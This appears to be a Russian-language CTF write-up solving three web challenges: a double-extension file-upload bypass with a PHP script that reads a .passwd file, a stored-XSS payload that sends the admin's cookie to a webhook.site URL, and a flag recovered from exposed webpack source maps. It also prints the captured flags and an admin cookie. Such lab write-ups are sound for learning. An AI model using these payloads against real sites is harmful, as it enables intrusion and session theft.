# File upload - Double extensions  
## Галерея v0.02 
Ваша цель - взломать эту фотогалерею, загрузив PHP-код.  
Получите пароль проверки в файле .passwd в корне приложения.  

Мы попадаем на сайт, в котором есть несколько разделов. В глаза бросается раздел "Upload"  
<img width="1919" height="988" alt="image" src="https://github.com/user-attachments/assets/0b2ec078-5ddc-4868-90e4-b6aef7017dc0" />  
Попробуем загрузить туда обычную картинку  
<img width="1919" height="1000" alt="image" src="https://github.com/user-attachments/assets/b59e1ff3-a395-4acd-a4ed-c5e4f3e0948b" />  
Нам дают ссылку, где хранится наша картинка. Попробуем загрузить туда php скрипт, но получаем предупреждение **Wrong file extension !**. Сервер пишет: **NB : only .gif, .jpeg and .png are accepted**  
Можно отправить на сервер файл shell.php.png с двойным расширением  
shell.php.png  
```php
<?php
phpinfo();
?>
```
отправляем на сервер и получаем:  
<img width="1919" height="995" alt="image" src="https://github.com/user-attachments/assets/f86da319-2fa6-452c-9faa-6734df7a9ecc" />  
Сервер обработал наш запрос и вывел конфигурацию php  
Сервер читает файл shell.php.png как PHP-код благодаря классической уязвимости, связанной с двойным расширением (Double Extension), которая возникает из-за специфической конфигурации веб-сервера, чаще всего Apache.
Написал скрипт, чтобы вытащить .passwd из корневой директории  
**shell.php.png**
```php
<?php
echo "<pre>";
// Директория для сканирования (одна директория назад)
$dir = '../../..'; 
$target_filename = '.passwd';
$target_filepath = "$dir/$target_filename";

// Сканируем родительскую директорию
$files = @scandir($dir);

if ($files === false) {
    die("Не удалось прочитать директорию '$dir'. Проверьте права доступа.");
}

echo "
======================================
      СПИСОК ФАЙЛОВ И ПАПОК В '$dir'
======================================\n";

// Перебираем полученный массив
foreach ($files as $item) {
    // Исключаем стандартные ссылки ('.' и '..')
    if ($item != '.' && $item != '..') {
        
        // Формируем полный путь для проверки типа элемента
        $path = "$dir/$item";
        
        if (is_dir($path)) {
            echo "[DIR]  $item\n";
        } else {
            // Выделяем потенциально важные файлы
            if (preg_match('/(\.flag|\.key|\.secret|\.conf|\.passwd|config\.php|\.htaccess)/i', $item)) {
                echo "[FILE] !!!! $item\n";
            } else {
                echo "[FILE] $item\n";
            }
        }
    }
}

$file_content = @file_get_contents($target_filepath);
if ($file_content === false) {
    die("Ошибка: Не удалось прочитать содержимое файла '$target_filepath'. Проверьте права доступа.");
}

// Вывод содержимого файла
echo "
======================================
  📜 СОДЕРЖИМОЕ ФАЙЛА '$target_filepath'
======================================\n";
echo htmlspecialchars($file_content);

echo "</pre>";
?>
```
После загрузки этого скрипта на сервер получаем содержимое флага и получаем флаг!  
<img width="1918" height="983" alt="image" src="https://github.com/user-attachments/assets/9e9ca1b9-a558-4b5e-b349-3f2d14718be5" />  
```Флаг: Gg9LRz-hWSxqqUKd77-_q-6G8```  


# XSS - Stockée 1  
## Украдите файл cookie сеанса администратора и используйте его для проверки события.  

При заходе на сайт, мы получаем такую форму  
<img width="1919" height="993" alt="image" src="https://github.com/user-attachments/assets/6006305e-4333-459d-aee8-38e897d43f81" />  
Так как в задании сказано про xss попробуем вызвать alert. Message: "**<script>alert('123);</script>**"  
<img width="1919" height="992" alt="image" src="https://github.com/user-attachments/assets/2a3b1fca-2bdb-4bc0-a030-4e0f8cfa000d" />  
Отлично! Мы имеем xss уязвимость. Так как у нас задание перехватить cookie админа, попробуем получить его с помощью скрипта, перенаправляющего пользователя на наш сайт, в url которого будут передаваться cookie пользователя, в надежде, что админ зайдет на него.  
Для этого получим ссылку на наш сайт через https://webhook.site/ и напишем небольшой скрипт ```<script>document.write('<img src="http://webhook.site/YOUR-UNIQUE-ID?cmd=' + document.cookie + '" width=0 height=0 border=0 />');</script>```. После подстановки 'YOUR-UNIQUE-ID' отправляю payload в поле _message_.  
Администратор зашел на сайт и мы получили его cookie!
<img width="793" height="76" alt="image" src="https://github.com/user-attachments/assets/ae74d2fa-d1bc-46dd-95d0-cab629a3bf9b" />  
```ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6```  

# Javascript - Webpack
## Найдите пароль.
При переходе на страницу, сразу смотрю исходный код. Замечаю, что все js лежат в директории **/static/js**
<img width="1919" height="272" alt="image" src="https://github.com/user-attachments/assets/ccd20e03-072a-4409-a6d7-14c7afe1abf1" />  
Перехожу в эту директорию и вижу файлы с расширением **.js.map** скачиваю первый из них. 
<img width="1105" height="952" alt="image" src="https://github.com/user-attachments/assets/a898d088-8f8d-4f96-ae66-5b6da06025ac" />  
Загружаю его на сайт **https://evanw.github.io/source-map-visualization/** для более удобного просмотра. 
<img width="1919" height="991" alt="image" src="https://github.com/user-attachments/assets/14c02f7f-6ac9-4bc8-8638-79fabf883f96" />  
Сразу замечаю интересный webpack с названием **YouWillNotFindThisRouteBecauseItIsHidden.vue**  
И сразу видно комментарий с флагом, оставленный автором.  
<img width="1919" height="987" alt="image" src="https://github.com/user-attachments/assets/b77002ee-d462-4b74-8658-a7c6442c548e" />  
```Флаг: BecauseSourceMapsAreGreatForDebuggingButNotForProduction``` 
